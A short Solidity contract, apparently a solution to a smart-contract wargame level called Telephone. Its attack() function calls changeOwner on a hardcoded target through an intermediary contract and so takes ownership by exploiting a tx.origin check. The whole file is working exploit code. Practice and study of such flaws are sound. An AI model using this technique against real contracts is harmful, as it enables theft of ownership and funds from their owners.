// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.16;

contract Telephone {
    address victim = 0x902e77b9ba2d5cDcc91a35A0e452D156ae09b8EA;

    function attack() public {
        bytes memory payload = abi.encodeWithSignature("changeOwner(address)", msg.sender);
        (bool success, ) = victim.call{value: 0}(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}